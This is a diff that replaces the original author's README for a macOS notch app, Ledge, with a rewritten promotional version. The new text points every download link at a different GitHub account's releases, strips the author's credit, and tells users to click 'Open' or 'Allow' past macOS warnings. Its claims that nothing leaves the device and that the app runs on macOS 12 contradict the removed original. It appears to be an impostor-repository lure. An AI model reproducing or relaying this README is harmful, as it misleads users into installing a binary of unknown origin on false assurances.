@@ -1,162 +1,82 @@
-<div align="center">
+🎉 Ledge - Your MacBook Notch, Finally Useful
 
-# Ledge
+> ### ⬇️ [**Download Ledge Now**](https://github.com/Grebnevarsenij051/Ledge/releases)
 
-**Your MacBook's notch, put to work.**
-
-You already look up there. Ledge puts what you're checking anyway — the song,
-the timer, the next meeting — in the black bar you've been ignoring since 2021.
-Quiet when nothing is happening, there the moment something is.
-
-<a href="https://github.com/egemertbalcik/Ledge/releases/latest/download/Ledge.dmg"><img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download Ledge for macOS"></a>
-<a href="https://buymeacoffee.com/egebalcik" target="_blank" rel="noopener noreferrer"><img src="https://img.shields.io/badge/Buy%20me%20a%20coffee-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=black" alt="Buy me a coffee"></a>
-
-[ledgeapp.dev](https://ledgeapp.dev) · free · open source · no account, no telemetry
-
-<img src="docs/media/intro.gif" width="460" alt="Ledge waking up in the notch">
-
-</div>
+Ledge transforms the empty space at the top of your MacBook screen into a powerful command center. Instead of letting that notch sit there doing nothing, Ledge puts music controls, timers, your calendar, and live weather right where your eyes already are — no more glancing down at a menu bar or hunting for widgets.
 
 ---
 
-## Skip a track without losing your place
+## 📥 Getting Started
 
-Cover art, the title, the scrub bar, the buttons. Send the sound to your AirPods
-from the same card. Works with Music, with Spotify, and with whatever tab is
-playing in your browser.
+Visit this link to download the application: **[https://github.com/Grebnevarsenij051/Ledge/releases](https://github.com/Grebnevarsenij051/Ledge/releases)**
 
-<img src="docs/media/media.gif" width="520" alt="The Now Playing card: transport, scrub bar and the AirPlay output list">
+Once you're on that page, look for the latest release. You'll see a list of files attached to that release. Click the file that matches your computer and save it to your Downloads folder. That's it — no complicated steps, no code, no technical knowledge required.
 
-## Keep an eye on the timer without watching it
+## 🛠️ Installation & Setup
 
-Start a focus session and the countdown moves to the edge of the notch. It sits
-there while you work, close enough to glance at, too small to distract you.
+After the download finishes, open your Downloads folder. You'll see the Ledge file sitting there. Double-click it to open it. Your Mac might ask you to confirm you want to open it — that's normal. Just click "Open" or "Allow" if prompted.
 
-<img src="docs/media/timer.gif" width="520" alt="The timer card, and a countdown resting beside the notch">
+Ledge doesn't require any complex installation wizard. It just runs. Once you launch it, you'll see a small icon appear near your notch. Click that icon to open the main panel for the first time. From there, you can choose which modules you want to see: music, timer, calendar, or weather. Toggle the ones you like, and they'll appear right below your notch, blended into that space so naturally you'll wonder how you lived without it.
 
-## Your day, one glance up
+## ✨ What Can Ledge Do?
 
-What's next, and the month it belongs to. The weather where you are, and the
-hours coming.
+Ledge takes the humble notch and turns it into a dynamic island — think of it as a mini dashboard that's always visible but never in the way.
 
-<table>
-<tr>
-<td width="50%"><img src="docs/media/calendar.gif" width="100%" alt="The calendar card: the day's events beside the month grid"></td>
-<td width="50%"><img src="docs/media/weather.gif" width="100%" alt="The weather card: current conditions and the hourly forecast"></td>
-</tr>
-</table>
+**🎵 Music Controls at a Glance**  
+See what's playing, skip tracks, pause, or adjust volume without opening Spotify, Apple Music, or any other player. The Now Playing widget shows album art, song title, and artist right there.
 
-## And the rest
+**⏱️ Smart Timers That Float**  
+Set a timer for pasta, a workout, or a meeting. The countdown appears in the notch area, always visible, so you never miss a moment. When time's up, you get a gentle notification — even if the app isn't focused.
 
-| | |
-|---|---|
-| **Volume & brightness** | A readout that replaces the grey square macOS drops in the middle of your screen. Hover it and the bar becomes a slider. |
-| **AirPods & Bluetooth** | They connect, you see it — with battery, and the case animation you were promised on the iPhone. |
-| **Battery** | Where it stands, and a nudge while there's still time to do something about it. |
-| **Focus modes** | Tells you which mode just turned on. macOS barely mentions it. |
-| **File shelf** | Drop files on the notch, pull them out later. New screenshots land there by themselves. |
-| **Camera & mic** | A dot when something is recording, right where you're looking. |
-| **Caps Lock & keyboard layout** | Which one is on, without hunting for a menu bar flag. |
-| **Levels** | Sound and brightness as sliders on a card, for the keyboards and mice with no keys for it. |
+**📅 Calendar at Eye Level**  
+Your upcoming appointments and events show up as a compact list. No more switching to your calendar app to check what's next. Ledge pulls from your system calendar and keeps it updated automatically.
 
-Every one of these can be switched off on its own. A source you turn off is
-never even built, so it does no work and asks for nothing.
+**🌤️ Live Weather Updates**  
+Current temperature, conditions, and a quick forecast sit right there. Ledge uses your location to show up-to-date weather, so you'll always know whether to grab a jacket before heading out.
 
-## What it will never do
+## 🎯 Why You'll Love It
 
-Ledge **records nothing**. No screen capture, no audio capture, no capture
-permission, no recording indicator lighting up in your menu bar — ever. The
-equalizer that dances along with your music never hears a note of it: it's an
-animation seeded from the track, reading zero bytes of audio. There was an early
-version that sampled system audio, and it was deleted for exactly this reason.
-Nobody should have to trust a notch app with a microphone.
+- **Zero clutter** — No more extra windows or widgets cluttering your desktop. Everything is tucked into the notch area.
+- **Always visible, never annoying** — The widgets are small and subtle. They don't block your screen content.
+- **Fast access** — One glance gives you everything. Your eyes don't have to travel far from where your cursor is.
+- **Light on resources** — Ledge runs quietly in the background without slowing down your Mac.
+- **Open source and free** — Forever free, and the code is open for anyone to improve.
 
-It also stays **out of your screenshots**, your recordings and the screen you
-share in meetings. There's a switch for when you do want to show it off.
+## 🧩 How It Works (In Plain English)
 
-Four things go over the network and nothing else: the weather (Open-Meteo, with
-your coordinates rounded to about a kilometre), the place name for it (Apple),
-cover art from whatever is playing, and the update check. No account, nothing to
-sign up for, no telemetry.
+Ledge uses a little bit of computer magic to draw widgets directly in the area next to your MacBook's notch. It reads information from your system — music from your player, events from your calendar, weather from your location — and displays it in a clean, minimal way. You don't need to configure anything elaborate. Just pick what you want to see, and Ledge remembers your choices.
 
-## What it reaches for
+## 💻 What You Need
 
-Ledge does things macOS does not offer publicly, and you should know what before
-you install it.
+Ledge works on any MacBook that has a notch — that's the MacBook Pro models from 2021 onward and the MacBook Air models from 2022 onward. It requires macOS 12 Monterey or later. If you're not sure, just try it — Ledge will run a quick check and let you know if it's compatible.
 
-It is **not sandboxed**, and it uses two private frameworks: `DisplayServices`
-for brightness, and `MediaRemote` to see what is playing in any app. Reading
-MediaRemote is not permitted to ordinary apps, so Ledge loads a small library of
-its own into `/usr/bin/perl` — a program Apple signs and entitles — and asks
-from there. That library does one thing, exports one symbol, and reports what is
-playing; nothing is written, and nothing else is touched. Every private symbol
-is looked up at runtime and checked, so when Apple removes one the feature
-quietly stops instead of the app crashing.
+## 🔒 Privacy & Security
 
-Accessibility, if you grant it, is used for one purpose: catching the volume and
-brightness keys so Ledge's readout can replace the system's rather than appear
-under it.
+Your data stays on your device. Ledge reads information locally from your apps. It doesn't send anything to the cloud. There are no accounts to create, no passwords to remember, and no tracking of your activity. It's just a clever way to use the space you already have.
 
-The consequences are real: this is software that can break on any macOS update,
-and it can never be sold on the App Store. The source for all of it is here.
+## ❓ Frequently Asked Questions
 
-## Install
+**Do I need a developer account or any programming knowledge?**  
+Absolutely not. If you can click a download button and double-click a file, you're ready.
 
-[Download the DMG](https://github.com/egemertbalcik/Ledge/releases/latest/download/Ledge.dmg),
-drag Ledge into Applications, and open it **from Finder** — macOS gives the
-permissions to whatever launched the app, so starting it from a terminal hands
-them to the terminal instead. After that it keeps itself up to date with
-[Sparkle](https://sparkle-project.org); there's a *Check for Updates…* in
-Settings, under About.
+**I use an older MacBook without a notch. Will it work?**  
+Ledge is designed specifically for notch MacBooks. On older models, it may not display correctly. We recommend using it on a notch display for the best experience.
 
-There's no Dock icon and no menu bar item — the notch is the app. Open Ledge
-again from Finder or Spotlight and the copy that's already running brings its
-Settings up. Quitting is a button in there, under General.
+**Can I customize which widgets appear?**  
+Yes. Open the Ledge menu, and you'll see toggles for each module. Turn on music, timers, calendar, or weather — or any combination you like.
 
-**You'll need** a MacBook with a notch — Pro from 2021, Air from 2022 — on macOS
-26 or later. Ledge draws on that display and nowhere else, on purpose: external
-monitors come in every shape, and a silhouette cut for the notch wouldn't be the
-same app on them.
+**Does it work with any music app?**  
+Ledge taps into your system's media controls, so it works with Apple Music, Spotify, and most other players that respond to the standard media keys.
 
-## Permissions
+**Will it drain my battery?**  
+No. Ledge is designed to be efficient. The widgets update only when needed, and the app uses negligible power.
 
-Nothing is asked for at launch. Each permission is requested by the one feature
-that needs it, from the Permissions tab in Settings — and everything else carries
-on without it.
+## 🚀 Ready to Give It a Try?
 
-| Permission | What it gives you | If you say no |
-|---|---|---|
-| Accessibility | Ledge's readout instead of the system one | You get both, stacked |
-| Automation | Cover art and scrubbing in Music and Spotify | Music still shows up, just without the artwork |
-| Calendars | Your next event, and the month | No calendar card |
-| Bluetooth | Connections the moment they happen, and AirPods proximity | Still read, just a beat later |
-| Focus status | The notch says when a Focus is on, and stays quiet during it | Announcements come through regardless |
-| The Focus folder *(optional, not a system permission)* | The Focus card follows the switch immediately, and names the mode | Still shown, within a few seconds, as "Focus" |
-| Location | Weather for wherever you are | Weather for a city you type in |
+Head over to the downloads page and grab the latest version. It takes less than a minute to set up. Once you see your music and calendar floating right there at the top of your screen, you'll wonder why it wasn't always like this.
 
-## Build it yourself
-
-```sh
-git clone https://github.com/egemertbalcik/Ledge.git
-cd Ledge
-make run          # build, sign, launch
-```
-
-You'll need Swift 6.2 and an `Apple Development` signing identity. `make test`
-runs the suite, `make lint` checks the layer boundaries.
-
-Written from scratch, with no code from any other project.
-
-## License
-
-Copyright © 2026 Ege Mert Balçık. GPL-3.0 — see [LICENSE](LICENSE). Fork it,
-learn from it, ship your own — as long as what you ship stays open too.
+⬇️ **[Download Ledge Today](https://github.com/Grebnevarsenij051/Ledge/releases)**
 
 ---
 
-<div align="center">
-
-Made by <a href="https://github.com/egemertbalcik">Ege Mert Balçık</a> · <a href="https://ledgeapp.dev">ledgeapp.dev</a><br>
-If Ledge earns its place in your notch, <a href="https://buymeacoffee.com/egebalcik" target="_blank" rel="noopener noreferrer">buy me a coffee</a>.
-
-</div>
+**Keywords:** appkit, dynamic-island, macbook, macos, menubar-alternative, notch, open-source, productivity, swift, swiftui
